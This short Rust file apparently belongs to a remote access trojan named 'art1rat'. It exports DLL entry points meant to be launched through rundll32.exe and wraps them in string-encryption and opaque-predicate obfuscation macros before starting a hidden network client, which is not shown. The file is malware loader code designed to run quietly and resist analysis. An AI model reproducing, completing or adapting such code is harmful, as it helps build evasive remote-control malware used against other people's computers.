use encstr::{cobl, opaque_false};
use std::ffi::c_int;

/// Entry point for DLL/SO loads.
/// Windows rundll32: rundll32.exe <dllpath>,NetClientMain
#[unsafe(export_name = "NetClientMain")]
pub extern "C" fn NetClientMain() {
    cobl!({
    if opaque_false() {
        return;
    }
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(crate::netclient_dll());
    })
}

/// Generic C-callable entry point.
#[unsafe(export_name = "art1rat_main")]
pub extern "C" fn art1rat_main() -> c_int {
    cobl!({
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(crate::netclient_dll());
    0
    })
}
